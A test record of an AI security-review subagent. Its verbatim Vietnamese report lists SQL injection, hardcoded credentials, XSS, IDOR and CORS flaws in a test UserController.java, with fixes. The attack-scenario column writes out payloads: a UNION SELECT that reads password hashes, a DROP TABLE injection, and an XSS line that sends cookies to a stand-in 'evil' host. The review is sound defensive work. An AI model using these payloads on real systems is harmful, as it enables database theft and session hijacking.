# Test result — security-reviewer

- Date: 2026-09-28
- Mode: real (headless `claude -p`)
- Delegated to: security-reviewer
- Correct agent triggered: yes
- Tools the subagent used: Bash, Glob, Read

## Prompt

Before release, check UserController.java for security problems only.

## Result (verbatim)

The `security-reviewer` subagent completed its review. Here is its full answer, unchanged:

---

## Tóm tắt rủi ro: Critical 2 · High 2 · Medium 1 · Low 0

Phạm vi: chỉ file `/tmp/claude-0/-home-user-super-apps/dc3b63d6-198e-59e3-b3c8-1c8b388a1027/scratchpad/agent-tests/security-reviewer/UserController.java` (29 dòng). Repo không có file nào khác: không có `pom.xml`/`build.gradle`, không có cấu hình Spring Security, không có `application.properties`.

Điểm dữ liệu không tin cậy đi vào: HTTP `GET /api/users/search?name=` (query param) và `GET /api/users/{id}/salary` (path param). Ngoài ra còn nội dung cột `users.name` trong DB, vốn do người dùng nhập từ trước.

| # | Mức độ | CWE / OWASP | File:dòng | Bằng chứng | Kịch bản tấn công | Cách sửa |
|---|--------|-------------|-----------|------------|-------------------|----------|
| 1 | Critical | CWE-89 / A03:2021 Injection | UserController.java:16-17 | `st.executeQuery("SELECT id, name FROM users WHERE name LIKE '%" + name + "%'")`. `name` lấy thẳng từ `@RequestParam` rồi nối chuỗi vào SQL. | `GET /api/users/search?name=%25' UNION SELECT id, password_hash FROM users--` sẽ hiện hash mật khẩu (hoặc bất kỳ bảng nào user `app` đọc được) ngay trong danh sách `<li>`. Với PostgreSQL JDBC, câu lệnh ghép kiểu `'; DROP TABLE users;--` cũng có thể được chạy dù `executeQuery` sau đó báo lỗi. Hậu quả: lộ toàn bộ DB, có thể sửa hoặc xóa dữ liệu. | Dùng `PreparedStatement`: `"... WHERE name LIKE ?"` và `ps.setString(1, "%" + escapeLike(name) + "%")` (escape `%`, `_`, `\`), hoặc dùng Spring Data/JPA với tham số bind. Cấp cho user DB chỉ quyền SELECT ở mức tối thiểu cần thiết. |
| 2 | Critical | CWE-798 / CWE-259 / A07:2021 (và A02) | UserController.java:10, 15 | `DB_PASSWORD = "Sup3rS3cret!"` được dùng để kết nối `jdbc:postgresql://db/app` với user `app`. | Ai đọc được source code (dev, CI log, artifact JAR sau khi decompile, repo bị lộ) đều có mật khẩu DB production. Nếu đứng được trong mạng nội bộ tới host `db` thì kết nối thẳng vào DB, bỏ qua hoàn toàn tầng ứng dụng. | Chuyển sang biến môi trường hoặc secret manager (Vault, K8s Secret) và dùng `DataSource` do Spring quản lý (`spring.datasource.password=${DB_PASSWORD}`). **Đổi mật khẩu DB này ngay** vì coi như đã lộ. Hiện file chưa được commit (xem mục lệnh bên dưới), nên cũng đừng commit nó ở dạng hiện tại. |
| 3 | High | CWE-79 / A03:2021 Injection (XSS) | UserController.java:18-20 | Code tự ghép HTML: `html.append("<li>").append(rs.getString("name"))` mà không encode. `@RestController` trả về `String`. Khi trình duyệt gửi `Accept: text/html`, `StringHttpMessageConverter` sẽ trả response với `Content-Type: text/html`. | (a) Stored XSS: kẻ tấn công đặt tên tài khoản là `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`, nạn nhân tìm kiếm thì script chạy. (b) Reflected XSS kết hợp lỗi #1: gửi nạn nhân link `/api/users/search?name=' UNION SELECT 1,'<script>...</script>'--`, script chạy trên origin của API. | Trả JSON (`List<UserDto>`) và để frontend (Angular) render, vì Angular tự escape. Nếu bắt buộc phải trả HTML thì encode bằng `HtmlUtils.htmlEscape(...)` hoặc OWASP Java Encoder, đặt `produces = "application/json"`, và thêm header `X-Content-Type-Options: nosniff` cùng CSP. |
| 4 | High | CWE-639 / CWE-862 / A01:2021 Broken Access Control (IDOR) | UserController.java:24-28 | `salary(@PathVariable long id)` không kiểm tra người gọi là ai. Comment ghi rõ: `// any logged-in user may call this`. Không có `@PreAuthorize` hay so sánh `id` với user hiện tại. | Nhân viên A đã đăng nhập duyệt tuần tự `GET /api/users/1/salary`, `/2/salary`, ... và đọc được lương của mọi người. Hiện hàm mới chỉ là stub (`"salary of " + id`), nhưng khi nối vào dữ liệu thật thì đây là lỗ hổng lộ dữ liệu nhạy cảm (PII/tài chính). Repo cũng không có cấu hình Spring Security, nên không chắc endpoint này có yêu cầu đăng nhập hay không (xem phần Cần xác minh). | Kiểm tra quyền ở server: `@PreAuthorize("hasRole('HR') or #id == authentication.principal.id")`, hoặc lấy id từ `Authentication` thay vì từ path (`/me/salary`). Thêm test cho trường hợp user A đọc lương user B phải nhận 403. |
| 5 | Medium | CWE-942 / A05:2021 Security Misconfiguration | UserController.java:8 | `@CrossOrigin(origins = "*", allowCredentials = "true")` | Ý định của cấu hình là cho mọi origin gọi API kèm cookie. Nếu nó có hiệu lực (Spring < 5.3, hoặc sau này ai đó "sửa" thành `originPatterns = "*"`), một trang độc hại bất kỳ có thể dùng `fetch(..., {credentials:'include'})` đọc `/search` và `/{id}/salary` bằng phiên của nạn nhân. Từ Spring 5.3 trở lên, tổ hợp này ném `IllegalArgumentException` lúc xử lý request, tức là lỗi cấu hình chứ không bị khai thác được. Vì không biết phiên bản Spring nên xếp Medium. | Chỉ liệt kê đúng các origin tin cậy (`origins = "https://app.example.com"`). Cấu hình CORS tập trung trong `SecurityFilterChain`/`CorsConfigurationSource`. Nếu dùng Bearer token thì bỏ `allowCredentials`. |

### Lệnh đã chạy (và kết quả thật)
- `Glob **/UserController.java`: chỉ tìm thấy `UserController.java` ở thư mục gốc.
- `git status --short; git log --oneline; ls -la`: `?? UserController.java`, `?? .claude/`, và `fatal: your current branch 'main' does not have any commits yet`. Nghĩa là chưa có commit nào, secret chưa vào git history, nên không có gì để quét bằng `git log -p -S`.
- `find .claude -type f`: chỉ có các file định nghĩa agent (`.md`), không liên quan tới code ứng dụng.
- Không chạy dependency audit vì không có `pom.xml`/`build.gradle`, không xác định được dependency.
- Không sửa file nào.

### Cần xác minh (chưa đủ bằng chứng)
- **`JWT_SECRET = "changeme"` (dòng 11)**: khai báo nhưng không được dùng trong file này. Nếu nơi khác dùng hằng số này (hoặc giá trị "changeme") để ký/verify JWT HMAC thì đây là Critical (CWE-798/CWE-321): kẻ tấn công tự ký token với `role=ADMIN` là giả mạo được bất kỳ user nào. Dù thế nào cũng nên xóa và dùng secret ngẫu nhiên ≥256 bit lấy từ secret manager.
- **Xác thực nói chung**: không có Spring Security config, nên chưa biết `/api/users/**` có bắt buộc đăng nhập hay không. Nếu không, cả `/search` (kèm SQLi) và `/salary` đều bị khai thác được mà không cần tài khoản.
- **Phiên bản Spring**: quyết định lỗi #5 có khai thác được hay không.
- **Lộ thông tin lỗi**: `search` ném `SQLException` ra ngoài. Nếu bật `server.error.include-message=always` hoặc `include-stacktrace`, thông báo lỗi SQL sẽ lộ ra, giúp khai thác SQLi dạng error-based. Chưa có config để kiểm tra.
- **DoS**: `name` không giới hạn độ dài và `LIKE '%...%'` không dùng được index, có thể bị lạm dụng để làm chậm DB. Chưa đủ ngữ cảnh (rate limit, kích thước bảng) để đánh giá.

### Ngoài phạm vi / không kiểm tra
- Chất lượng code không liên quan bảo mật, ví dụ mở `DriverManager` mỗi request thay vì dùng connection pool (theo yêu cầu thì bỏ qua).
- Frontend, mobile, CI/CD, hạ tầng TLS và DB: không có trong repo.
- Dependency có lỗ hổng: không có file build để audit.
- Không chạy thử tấn công nào; mọi kịch bản trên đều suy ra từ việc đọc code.
